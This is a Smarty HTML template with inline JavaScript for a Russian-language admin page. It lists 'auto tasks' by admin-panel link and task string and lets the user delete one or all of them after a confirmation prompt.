<form action="/admins/auto_tasks.html?window=1" enctype="application/x-www-form-urlencoded" method="post" name="add_sub{$rand_name}" id="add_sub{$rand_name}" onsubmit="submit_{$rand_name}(); return false;">
  <table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bg4" style="border: 1px solid #FFFFFF">
	<th style="width:250px;">Админка</th>
    <th>Задание</th>
	<th style="width:1px"><a href="#" onclick="return submit_{$rand_name}('&str=ALL');"><img src="/images/delete.png" alt="Удаление" /></th>
</tr>
{foreach from=$cmds item=cmd name=cmds}
{if $smarty.foreach.cmds.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; font-size:11px;">
	<th>{$cmd->link}</th>
	<th>{$cmd->cmd}</th>
    <th><a href="#" onclick="return submit_{$rand_name}('&id=' + {$cmd->id});"><img src="/images/delete.png" alt="Удаление" /></a></th>
</tr>
{/foreach}
</table>
</form>

<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.forms['add_sub{$rand_name}'].parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Авто задания';

function submit_{$rand_name}(id){ldelim}

if(id == '&str=ALL'){ldelim}
	var text = 'Действительно удалить все авто задания?';
{rdelim}else{ldelim}
	var text = 'Действительно удалить?';
{rdelim}

if(confirm(text)){ldelim}
	hax(document.forms['add_sub{$rand_name}'].action + id,
	{ldelim}
		method: document.forms['add_sub{$rand_name}'].method,
		form: 'add_sub{$rand_name}',
		id: id_{$rand_name} + '_content',
		nohistory:true,
		nocache:true,
		destroy:true,
		rc:true
	{rdelim}
	)
document.getElementById(id_{$rand_name} + '_content').innerHTML = '<br /><div align="center"><img src="/images/indicator.gif" title="Загрузка" alt="Загрузка" /></div>';
{rdelim}
{rdelim};
</script>